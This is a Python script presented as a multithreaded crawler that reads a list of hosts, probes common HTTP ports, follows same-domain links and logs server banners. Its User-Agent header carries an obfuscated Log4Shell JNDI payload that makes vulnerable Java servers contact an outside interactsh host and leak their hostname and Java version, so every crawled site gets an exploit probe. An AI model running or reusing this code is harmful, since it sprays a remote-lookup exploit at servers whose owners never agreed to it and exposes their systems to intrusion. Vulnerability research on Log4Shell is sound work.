import site
import requests

requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
import colorama
from colorama import Fore
import os
import re
from urllib.parse import urlparse
from bs4 import BeautifulSoup

colorama.init(autoreset=True)
import argparse

folder = os.path.dirname(__file__)
visited_pages = []
output_strings = []
max_crawl_depth = 2
max_crawl_count = 10


def main():
    with open(input_file, "r") as myfile:
        content = myfile.readlines()

        with ThreadPoolExecutor(max_workers=20) as executor:
            for line in content:
                # only use url and not banner
                if "," in line:
                    url_array = line.split(",")
                    line = url_array[0]
                url = line.strip()
                if line.startswith("http"):
                    executor.submit(start_crawler, url, 0, 0)
                else:
                    executor.submit(start_crawler, "http://" + url + "/", 0, 0)
                    executor.submit(
                        start_crawler, "http://" + url + ":8080/", 0, 0
                    )
                    executor.submit(
                        start_crawler, "http://" + url + ":8081/", 0, 0
                    )
                    executor.submit(
                        start_crawler, "https://" + url + "/", 0, 0
                    )
                    executor.submit(
                        start_crawler, "https://" + url + ":4434/", 0, 0
                    )
                    executor.submit(
                        start_crawler, "https://" + url + ":8443/", 0, 0
                    )

def start_crawler(url, limit, counter):
    limit = limit + 1
    if limit > max_crawl_depth:
        return

    if counter > max_crawl_count:
        return

    try:
        site_response = request_url(url)
        if site_response:
            # find links and start crawling!
            soup = BeautifulSoup(site_response.text, "html.parser")
            get_banner(site_response)
            parsed_url = urlparse(site_response.url)
            base_tag = soup.find("base")
            link_array = re.findall(
                r"(http|https):\/\/([\w\-_]+(?:(?:\.[\w\-_]+)+))([\w\-\.,@?^=%&:/~\+#]*[\w\-\@?^=%&/~\+#])?",
                site_response.text,
            )

            # get html links
            a_tags = soup.find_all("a")
            for a_tag in a_tags:
                counter = counter + 1
                link = a_tag.attrs.get("href")

                if link and link.startswith("/"):
                    port = ""
                    if parsed_url.port:
                        port = ":" + str(parsed_url.port)
                    full_link = (
                        parsed_url.scheme + "://" + parsed_url.hostname + port + link
                    )
                    start_crawler(full_link, limit, counter)

                # check base tag urls
                if base_tag:
                    base = base_tag.attrs.get("href")
                    port = ""
                    if parsed_url.port:
                        port = ":" + str(parsed_url.port)
                    full_link = parsed_url.scheme + "://" + base + port + link
                    start_crawler(full_link, limit, counter)

                # absolut urls to same domain
                if link and link.startswith("http:"):
                    if parsed_url.hostname in link:
                        start_crawler(link, limit, counter)

            # get http links
            for link_parts in link_array:
                full_url = link_parts[0] + "://" + link_parts[1] + link_parts[2]
                if parsed_url.hostname in full_url:
                    counter = counter + 1
                    start_crawler(full_url, limit, counter)
    except Exception as e:
        print(e)

def request_url(url):
    try:
        if url not in visited_pages:
            safe_url = ""
            try:
                safe_url = url.findall("\w")
                safe_url = safe_url[0]
            except:
                pass
            session = requests.session()
            # session.headers[
            #     "User-Agent"
            # ] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
            session.headers[
                "User-Agent"
            ] = "${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.c6scl2is1s41vcjs2890cghcidoyyyyyn.interactsh.com/pocrequest}"
            header = session.head(url=url, timeout=3, verify=False)

            # check status code
            if header.status_code >= 400:
                return False

            # check content type
            one_allowed_content_type = False
            for allowed_content_type in ["html", "plain", "xml", "text", "json"]:
                if (
                    not header.headers.get("content-type")
                    or allowed_content_type
                    in header.headers.get("content-type").lower()
                ):
                    one_allowed_content_type = True
            if not one_allowed_content_type:
                return False

            response = session.get(url=url, timeout=3, verify=False)
            session.close()

            visited_pages.append(url)
            return response

    except Exception as e:
        return False

def get_banner(response):
    banner_array = []
    banner_array.append(response.url)
    try:
        banner_array.append(response.headers.get("Server"))
    except:
        pass

    fullstring = ", ".join(str(item) for item in banner_array)
    if fullstring not in output_strings:
        output_strings.append(fullstring)
        print(Fore.GREEN + fullstring)
        with open(output_file, "a") as out:
            out.write(fullstring + "\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Crawl websites from domain or url list."
    )
    parser.add_argument(
        "-i", type=str, default="./input.txt", help="Path to input file"
    )
    parser.add_argument(
        "-o", type=str, default="./output.txt", help="Path to output file"
    )
    args = parser.parse_args()
    input_file = args.i
    output_file = args.o
    main()